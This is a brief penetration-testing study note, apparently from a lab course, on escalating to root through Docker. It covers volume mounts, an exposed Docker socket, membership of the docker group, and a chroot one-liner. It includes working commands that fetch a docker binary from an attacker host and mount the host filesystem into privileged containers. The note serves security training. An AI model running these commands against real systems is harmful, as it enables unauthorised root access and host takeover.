## Docker Privilege Escalation
#### Docker Shared Directories
When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem.
When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.

----
#### Docker Sockets
A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon.
```shell
ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running.
```shell
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
./docker -H unix:///app/docker.sock ps
```

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. 
```shell
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
./docker -H unix:///app/docker.sock ps
```

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
```shell
./docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

---
#### Docker Group
To gain root privileges through Docker, the user we are logged in with must be in the `docker` group.
Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

#### Docker Socket
```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```